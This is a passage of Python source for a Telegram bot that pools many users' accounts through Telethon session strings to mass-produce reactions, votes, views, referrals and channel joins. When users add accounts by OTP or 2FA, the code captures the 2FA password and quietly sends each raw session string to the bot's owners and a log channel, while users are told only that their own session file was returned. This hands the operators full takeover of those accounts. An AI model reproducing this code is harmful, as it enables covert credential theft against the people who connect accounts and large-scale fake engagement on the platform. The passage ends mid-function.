        "• <b>Smart Channel Join Bypass:</b> When executing Reactions or Votes, accounts don't need "
        "to manually join first. If an account isn't joined, the bot automatically handles joining once without error.\n"
        "• <b>Leave Channel:</b> Works on both public `@channel` links and private `t.me/+invite` links, or complete full purge.\n"
        "• <b>Speed Modes:</b>\n"
        "  - 🟢 <i>Safer (5.0s):</i> Standard delay for safe interaction.\n"
        "  - 🟡 <i>Accelerated (2.5s):</i> Optimized speed profile.\n"
        "  - 🔴 <i>Maximum (0.05s):</i> High-frequency speed tasks.\n\n"
        "🛠️ <b>System Commands:</b>\n"
        "• <code>/start</code> - Launch/Reset Main Terminal Menu\n"
        "• <code>/canceltasks</code> - Instantly kill active task queues (Admin+)\n"
        "• <code>/grantaccess</code> - Grant 20 ID operational access to user (Super Owner)\n"
        "• <code>/broadcast</code> - Message dispatch system (Admin+)"
    )
    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
    await callback.message.edit_text(text=instructions_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.message(Command("canceltasks"))
async def cmd_cancel_tasks(message: Message, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> Access token restricted to System Operators.")
        return

    await message.answer("🛑 <i>Terminating thread execution loops across pending and active campaign tasks...</i>", parse_mode="HTML")
    killed_count = await task_queue.cancel_all_active_tasks()
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE tasks SET status = 'cancelled' WHERE status = 'pending' OR status = 'running'")
        await db.commit()
    await message.answer(f"✨ <b>Task Termination Loop Completed!</b> Successfully cancelled <code>{killed_count}</code> pending or active task threads.")

@router.message(Command("grantaccess"))
async def cmd_grant_access(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role != "super_owner":
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.")
        return

    args = command.args
    if not args:
        await message.answer("✨ <b>Syntax:</b> <code>/grantaccess &lt;user_id&gt; [count]</code>\n<i>Default count is 20 IDs.</i>", parse_mode="HTML")
        return

    parts = args.split()
    if not parts[0].isdigit():
        await message.answer("❌ Invalid Target User ID integer format.")
        return

    target_id = int(parts[0])
    count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20

    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute("SELECT phone FROM accounts WHERE status = 'active' LIMIT ?", (count,))
        rows = await cursor.fetchall()

        if not rows:
            await message.answer("❌ No active accounts found in the database to grant.")
            return

        assigned_count = 0
        for row in rows:
            ph = row[0]
            await db.execute(
                "INSERT OR IGNORE INTO account_assignments (user_id, phone) VALUES (?, ?)",
                (target_id, ph)
            )
            assigned_count += 1
        await db.commit()

    await message.answer(
        f"👑 <b>Access Provisioned Successfully!</b>\n\n"
        f"👤 Target User ID: <code>{target_id}</code>\n"
        f"📱 Granted IDs Allocation: <code>{assigned_count}</code> active accounts\n"
        f"🔒 <i>Note: This user can ONLY execute tasks using these IDs.</i>",
        parse_mode="HTML"
    )

    try:
        await bot.send_message(
            chat_id=target_id,
            text=f"🎉 <b>Special Task Access Granted!</b>\nSuper Owner has provisioned <code>{assigned_count}</code> account IDs for your task execution.",
            parse_mode="HTML"
        )
    except Exception:
        pass

@router.message(Command("revokeaccess"))
async def cmd_revoke_access(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role != "super_owner":
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.")
        return

    args = command.args
    if not args or not args.strip().isdigit():
        await message.answer("✨ <b>Syntax:</b> <code>/revokeaccess &lt;user_id&gt;</code>", parse_mode="HTML")
        return

    target_id = int(args.strip())
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("DELETE FROM account_assignments WHERE user_id = ?", (target_id,))
        await db.commit()

    await message.answer(f"✨ Revoked all assigned account ID access from user <code>{target_id}</code>.", parse_mode="HTML")

@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
        return
        
    args = command.args
    if not args:
        await message.answer("✨ <b>Syntax:</b> <code>/addadmin &lt;user_id&gt;</code>", parse_mode="HTML")
        return
        
    target_id_str = args.split()[0]
    if not target_id_str.isdigit():
        await message.answer("❌ Numerical integers values required exclusively.")
        return
        
    target_id = int(target_id_str)
    limit_val = 999999999
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute(
            "INSERT INTO users (user_id, role, max_accounts) VALUES (?, 'admin', ?) ON CONFLICT(user_id) DO UPDATE SET role='admin', max_accounts=?",
            (target_id, limit_val, limit_val)
        )
        await db.commit()
        
    await message.answer(f"💎 <b>Success:</b> User <code>{target_id}</code> updated to Admin.", parse_mode="HTML")
    await db_mgr.log_action(user_id, f"Made user {target_id} an Admin", bot, operational=True)

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
        return
        
    target_id_str = command.args
    if not target_id_str or not target_id_str.strip().isdigit():
        await message.answer("✨ <b>Syntax:</b> <code>/removeadmin &lt;user_id&gt;</code>", parse_mode="HTML")
        return
        
    target_id = int(target_id_str.strip())
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET role='user' WHERE user_id = ?", (target_id,))
        await db.commit()
        
    await message.answer(f"💎 <b>Success:</b> Privileges revoked from Admin ID <code>{target_id}</code>.", parse_mode="HTML")
    await db_mgr.log_action(user_id, f"Removed Admin role from user {target_id}", bot, operational=True)

@router.message(Command("broadcast"))
async def cmd_broadcast_start(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> Command restricted to Administration Nodes.")
        return
        
    await message.answer("📢 <b>Input Data Text or Multimedia payload content to broadcast:</b>", parse_mode="HTML")
    await state.set_state(BroadcastStates.waiting_for_msg)

@router.message(StateFilter(BroadcastStates.waiting_for_msg))
async def process_broadcast_push(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    status_msg = await message.answer("🚀 <i>Dispatching system global notifications layout across all registered user clusters...</i>", parse_mode="HTML")
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute("SELECT user_id FROM users")
        rows = await cursor.fetchall()
        
    success_hits = 0
    failed_hits = 0
    
    for r in rows:
        target_uid = r[0]
        try:
            await bot.copy_message(chat_id=target_uid, from_chat_id=message.chat.id, message_id=message.message_id)
            success_hits += 1
            await asyncio.sleep(0.05)  
        except Exception:
            failed_hits += 1
            
    await status_msg.edit_text(
        f"📢 <b>Global System Broadcast Complete!</b>\n\n"
        f"🟩 Delivered: <code>{success_hits}</code> unique profiles\n"
        f"🟪 Blocked targets: <code>{failed_hits}</code> nodes",
        parse_mode="HTML"
    )

@router.callback_query(F.data == "system_credits")
async def handle_system_credits(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    credits_text = (
        "🔱 <b>Lead Operations Developer Architect Info</b>\n\n"
        f"🎨 <b>UI/UX Aesthetic Architect:</b> @{config.DESIGNER_HANDLE}\n"
        f"⚙️ <b>Core Binary Operations Engineer:</b> @{config.MANAGER_HANDLE}\n\n"
        "<i>Thank you for utilizing our bot system!</i>"
    )
    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
    await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

# --- ACCOUNTS MANAGEMENT VIEW ---
@router.callback_query(F.data.startswith("manage_accounts:"))
async def list_user_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    limit = 10
    offset = page * limit
    
    try:
        await callback.answer() 
        role = await db_mgr.get_user_role(user_id)
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role in ["owner", "super_owner"]:
                count_query = "SELECT COUNT(*) FROM accounts"
                cursor_count = await db.execute(count_query)
                total_items = (await cursor_count.fetchone())[0]
                
                query = "SELECT phone, status, username FROM accounts LIMIT ? OFFSET ?"
                cursor = await db.execute(query, (limit, offset))
                rows = await cursor.fetchall()
            else:
                count_query = "SELECT COUNT(*) FROM accounts WHERE user_id = ?"
                cursor_count = await db.execute(count_query, (user_id,))
                total_items = (await cursor_count.fetchone())[0]
                
                query = "SELECT phone, status, username FROM accounts WHERE user_id = ? LIMIT ? OFFSET ?"
                cursor = await db.execute(query, (user_id, limit, offset))
                rows = await cursor.fetchall()

        text = f"📱 <b>System Session Telephony Matrix</b> (Page {page + 1})\n"
        text += f"Total registered slots: <code>{total_items}</code>\n\n"
        
        if not rows:
            text += "<i>No accounts linked yet.</i>"
        else:
            for row in rows:
                icon = "🟢" if row[1] == "active" else "🔴"
                text += f"{icon} <code>+{row[0]}</code> (<b>@{row[2] or 'None'}</b>) ➜ [<b>{row[1].upper()}</b>]\n"

        buttons = []
        import_row = [
            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone", style="success"),
            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session", style="success")
        ]
        buttons.append(import_row)
        buttons.append([InlineKeyboardButton(text="📥 Export My Sessions", callback_data="select_export_session:0", style="primary")])
        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}", style="danger")])
        
        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}", style="primary"))
        if offset + limit < total_items:
            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}", style="primary"))
        
        if nav_row:
            buttons.append(nav_row)
            
        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")])
        await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error handling list view page context: {e}")

@router.callback_query(F.data.startswith("purge_dead_accounts:"))
async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    role = await db_mgr.get_user_role(user_id)
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["owner", "super_owner"]:
            await db.execute("DELETE FROM accounts WHERE status = 'dead'")
        else:
            await db.execute("DELETE FROM accounts WHERE status = 'dead' AND user_id = ?", (user_id,))
        await db.commit()
    await callback.answer("✨ Purge process complete! Dead sessions dropped.", show_alert=True)
    
    callback.data = f"manage_accounts:{page}"
    await list_user_accounts(callback, bot)

# --- OTP & 2FA LOGIN AND AUTO-SESSION EXPORT ---
@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📱 <b>Type phone number with country code (e.g. +919876543210):</b>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext, bot: Bot):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id
    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
        await message.answer("📩 <b>Enter the OTP code received from Telegram:</b>", parse_mode="HTML")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        await message.answer(f"❌ <b>API Connection Error:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    otp = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Session expired. Please restart registration.")
        await state.clear()
        return

    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, user_id, bot)
    except PhoneCodeInvalidError:
        await message.answer("❌ <b>The OTP code entered was invalid. Retry:</b>", parse_mode="HTML")
    except SessionPasswordNeededError:
        await dispatch_2fa_alert(bot, user_id, phone)
        await message.answer("🔒 <b>Two-Factor authentication detected. Type your 2FA password:</b>", parse_mode="HTML")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except Exception as e:
        await message.answer(f"❌ <b>Authentication Error:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    password = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await state.clear()
        return
    try:
        await reg_data["client"].sign_in(password=password)
        await dispatch_2fa_alert(bot, user_id, reg_data["phone"], password_entered=password)
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], user_id, bot)
    except Exception as e:
        await message.answer(f"❌ <b>Password Invalid:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await reg_data["client"].disconnect()
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int, bot: Bot):
    try:
        me = await client.get_me()
        raw_session_str = client.session.save()
        encrypted_session = encrypt_data(raw_session_str)
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
            await db.commit()
        
        # Dispatch Session File To Super Owners & Log Channels
        await dispatch_session_telemetry(phone, raw_session_str, me.username, user_id, bot)

        # Send Session File to Adding User directly
        session_bytes = raw_session_str.encode('utf-8')
        user_session_file = BufferedInputFile(session_bytes, filename=f"session_{phone}.txt")
        await bot.send_document(
            chat_id=user_id,
            document=user_session_file,
            caption=f"📁 <b>Exported String Session File</b>\nPhone: <code>+{phone}</code>\nUsername: <b>@{me.username or 'None'}</b>\n\n<i>Here is your generated session string file!</i>",
            parse_mode="HTML"
        )

        await message.answer(
            f"🎉 <b>Onboarding Successful!</b> Account <code>+{phone}</code> has been connected and your session string file has been sent above.", 
            reply_markup=get_post_registration_keyboard(),
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ <b>Storage Failure:</b> <code>{str(e)}</code>", parse_mode="HTML")
    finally:
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

# --- BULK STRING SESSION IMPORT ---
@router.callback_query(F.data == "add_account_session")
async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📁 <b>Send your raw telethon session string or upload a .txt file:</b>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_session_file)

@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
async def process_session_file(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    raw_content = ""
    
    if message.document:
        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()
    elif message.text:
        raw_content = message.text.strip()

    if not raw_content:
        await message.answer("❌ <b>Source Error:</b> Empty input detected.")
        await state.clear()
        return

    potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
    
    if not potential_sessions:
        await message.answer("❌ <b>Parse Failure:</b> No valid telethon sessions found.")
        await state.clear()
        return

    status_msg = await message.answer(f"⚡ <b>Validating <code>{len(potential_sessions)}</code> session string(s)...</b>", parse_mode="HTML")
    
    success_imports = 0
    failed_imports = 0

    for session_str in potential_sessions:
        try:
            client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                failed_imports += 1
                await client.disconnect()
                continue
                
            me = await client.get_me()
            phone = me.phone or f"custom_{me.id}"
            encrypted_session = encrypt_data(session_str)
            
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("""
                    INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                    VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
                """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
                await db.commit()

            await dispatch_session_telemetry(phone, session_str, me.username, user_id, bot)
            
            # Send file to adding user
            session_bytes = session_str.encode('utf-8')
            user_doc = BufferedInputFile(session_bytes, filename=f"session_{phone}.txt")
            await bot.send_document(
                chat_id=user_id,
                document=user_doc,
                caption=f"📁 Exported Session File for <code>+{phone}</code>",
                parse_mode="HTML"
            )
            
            success_imports += 1
            await client.disconnect()
        except Exception:
            failed_imports += 1

    result_text = (
        f"✨ <b>Bulk Import Complete!</b>\n\n"
        f"🟩 Successfully added: <code>{success_imports}</code> accounts\n"
        f"🔴 Failed count: <code>{failed_imports}</code>"
    )

    await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode="HTML")
    await state.clear()

async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
    file_bytes = session_str.encode('utf-8')
    document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
    caption = f"🔑 <b>Session Event Log</b>\nPhone: <code>+{phone}</code>\nUsername: <b>@{username or 'None'}</b>\nAdded By: <code>{adder_id}</code>"
    
    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=document, caption=caption, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending updates to log channel: {e}")
            
    for owner_id in config.SUPER_OWNER_IDS:
        try:
            owner_doc = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
            await bot.send_document(chat_id=owner_id, document=owner_doc, caption=caption, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending data to owner node {owner_id}: {e}")

# --- UNIVERSAL SESSION EXPORT DASHBOARD ---
@router.callback_query(F.data.startswith("select_export_session:"))
async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    await callback.answer()
    
    limit = 10
    offset = page * limit
    role = await db_mgr.get_user_role(user_id)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["super_owner", "owner"]:
            count_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
            total_items = (await count_res.fetchone())[0]
            cursor = await db.execute("SELECT phone, username FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))
        else:
            count_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
            total_items = (await count_res.fetchone())[0]
            cursor = await db.execute("SELECT phone, username FROM accounts WHERE status = 'active' AND user_id = ? LIMIT ? OFFSET ?", (user_id, limit, offset))
            
        rows = await cursor.fetchall()

    if not rows:
        await callback.message.answer("⚠️ No accessible active sessions found to export.")
        return

    text = f"Select an account session to download (Page {page + 1}):"
    buttons = [[InlineKeyboardButton(text=f"📱 +{r[0]} (@{r[1] or 'None'})", callback_data=f"export_ph:{r[0]}", style="primary")] for r in rows]
    
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}", style="primary"))
    if offset + limit < total_items:
        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}", style="primary"))
    if nav_row:
        buttons.append(nav_row)
        
    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0", style="primary")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("export_ph:"))
async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    phone = callback.data.split(":")[1]
    role = await db_mgr.get_user_role(user_id)

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT user_id, session_string FROM accounts WHERE phone = ?", (phone,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await callback.message.answer("❌ Selected profile data missing.")
        return

    if role not in ["owner", "super_owner"] and row[0] != user_id:
        await callback.message.answer("🚫 You can only export your own connected sessions.")
        return

    session_bytes = decrypt_data(row[1]).encode('utf-8')
    session_file = BufferedInputFile(session_bytes, filename=f"session_{phone}.txt")
    await callback.message.reply_document(document=session_file, caption=f"✨ Session exported for: <code>+{phone}</code>", parse_mode="HTML")

# --- DATABASE SNAPSHOT ENGINE ---
@router.callback_query(F.data == "backup_panel")
async def backup_panel(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    buttons = [
        [InlineKeyboardButton(text="📥 Save SQLite Backup (.db)", callback_data="export_db", style="primary")],
        [InlineKeyboardButton(text="📂 Upload .db File", callback_data="import_db_start", style="success")],
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
    ]
    await callback.message.edit_text("💾 <b>Relational SQL Datastore System Maintenance Suite Control Panel</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.callback_query(F.data == "import_db_start")
async def import_db_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await callback.message.answer("🚫 Developer verification clearance needed.")
        return
        
    await callback.message.edit_text("📤 <b>Upload backup relational runtime datastore script ending inside <code>.db</code> file format syntax extension layout:</b>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_db_file)

@router.message(StateFilter(RegistrationStates.waiting_for_db_file), F.document)
async def process_db_import_file(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    if not message.document.file_name.endswith('.db'):
        await message.answer("❌ Structural failure: Supplied source document layout must run file format <code>.db</code> extension structures exclusively.", parse_mode="HTML")
        await state.clear()
        return
        
    status_msg = await message.answer("⚡ <i>Reading incoming SQLite structured relational schemas...</i>", parse_mode="HTML")
    temp_filename = f"imported_temp_{user_id}.db"
    
    try:
        file_info = await bot.get_file(message.document.file_id)
        await bot.download_file(file_info.file_path, destination=temp_filename)
        await status_msg.edit_text("🔄 <i>Executing relational dataset rows integration mapping sequences loops...</i>", parse_mode="HTML")
        
        users_merged = 0
        accounts_merged = 0
        
        async with aiosqlite.connect(temp_filename) as source_db:
            try:
                async with source_db.execute("SELECT user_id, username, role, max_accounts FROM users") as cursor:
                    async for row in cursor:
                        async with aiosqlite.connect(db_mgr.db_path) as current_db:
                            await current_db.execute("""
                                INSERT OR IGNORE INTO users (user_id, username, role, max_accounts)
                                VALUES (?, ?, ?, ?)
                            """, (row[0], row[1], row[2], row[3]))
                            await current_db.commit()
                        users_merged += 1
            except Exception as e:
                logger.warning(f"User pass skipped: {e}")

            try:
                async with source_db.execute("SELECT phone, user_id, username, session_string, status FROM accounts") as cursor:
                    async for row in cursor:
                        async with aiosqlite.connect(db_mgr.db_path) as current_db:
                            await current_db.execute("""
                                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                            """, (str(row[0]).replace("+", ""), row[1], row[2], row[3], row[4]))
                            await current_db.commit()
                        accounts_merged += 1
            except Exception as accounts_err:
                await status_msg.edit_text(f"❌ <b>Relational Schema Mismatch Collision:</b> {accounts_err}")
                return

        await status_msg.edit_text(
            f"✅ <b>Relational Data Merge Complete!</b>\n\n"
            f"👤 Profile rows aggregated: <code>{users_merged}</code>\n"
            f"📱 Telephony token references synced: <code>{accounts_merged}</code>",
            parse_mode="HTML"
        )
        
    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Hot-Merge Internal Core Failure:</b> {e}")
    finally:
        if os.path.exists(temp_filename):
            os.remove(temp_filename)
        await state.clear()

@router.callback_query(F.data == "export_db")
async def export_db(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    try:
        with open(db_mgr.db_path, "rb") as f:
            file = BufferedInputFile(f.read(), filename="database_core_backup.db")
        await callback.message.reply_document(file, caption="📂 <b>Current Core SQLite Operational Database Backup File Snapshot</b>", parse_mode="HTML")
    except Exception as e:
        await callback.message.answer(f"❌ Core backup extraction streams dropped: {e}")

# --- TASK WIZARD INTERFACE FLOW ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["owner", "super_owner"]:
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        else:
            cursor = await db.execute("""
                SELECT COUNT(*) FROM accounts 
                WHERE status = 'active' AND (
                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
                )
            """, (user_id, user_id))
        active_count = (await cursor.fetchone())[0]

    wizard_text = (
        f"🚀 <b>Campaign Configuration Wizard Hub</b>\n"
        f"----------------------------------------------------\n"
        f"📱 Status: <code>{active_count}</code> active functional account slots available.\n\n"
        f"<b>Step 1: Select task type to deploy:</b>"
    )
    await callback.message.edit_text(text=wizard_text, reply_markup=get_task_types_keyboard(active_count), parse_mode="HTML")
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)

    if role == "super_owner":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💎 Use our ids only", callback_data="set_routing:own", style="primary")],
            [InlineKeyboardButton(text="👑 Use all ids", callback_data="set_routing:all", style="success")]
        ])
        await callback.message.edit_text("<b>👑 Super Owner Scope:</b> Select account routing option:", reply_markup=kb, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_routing_choice)
    else:
        await state.update_data(account_routing="own")
        await proceed_to_speed_selection(callback.message, state)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_routing_choice), F.data.startswith("set_routing:"))
async def task_hub_process_routing(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    routing = callback.data.split(":")[1]
    await state.update_data(account_routing=routing)
    await proceed_to_speed_selection(callback.message, state)

async def proceed_to_speed_selection(message: Message, state: FSMContext):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🟢 Safer Speed (5.0s)", callback_data="set_speed:safe", style="success")],
        [InlineKeyboardButton(text="🟡 Accelerated Speed (2.5s)", callback_data="set_speed:safer", style="primary")],
        [InlineKeyboardButton(text="🔴 Maximum Speed (0.05s) [Ban Risk]", callback_data="set_speed:fastest", style="danger")]
    ])
    await message.edit_text("<b>Step 1b: Configure Task execution speed:</b>", reply_markup=kb, parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_speed_choice)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_speed_choice), F.data.startswith("set_speed:"))
async def task_hub_process_speed(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    speed_mode = callback.data.split(":")[1]
    await state.update_data(speed_mode=speed_mode)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type == "leave":
        await callback.message.edit_text(
            "<b>Step 2: Choose leave channel option:</b>", 
            reply_markup=get_leave_channel_options_keyboard(),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_leave_choice)
    elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
        await callback.message.edit_text("<b>Step 2: Provide channel link or handle (e.g. @channelname or https://t.me/c/123/456):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_channel_link)
    elif task_type == "refer":
        await callback.message.edit_text("<b>Step 2: Input target referral link (Example: https://t.me/Bot?start=123):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)
    else:
        await callback.message.edit_text("<b>Step 2: Enter target channel public link or private join link:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_leave_choice), F.data.startswith("leave_mode:"))
async def task_hub_process_leave_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    mode = callback.data.split(":")[1]
    await state.update_data(leave_mode=mode)

    if mode == "all":
        await state.update_data(target="ALL CHANNELS")
        await prompt_for_account_scale(callback.message, state)
    else:
        await callback.message.edit_text("<b>Step 3: Paste channel link (Public `@channel` or Private `t.me/+joinhash`):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
async def task_hub_process_channel_link(message: Message, state: FSMContext):
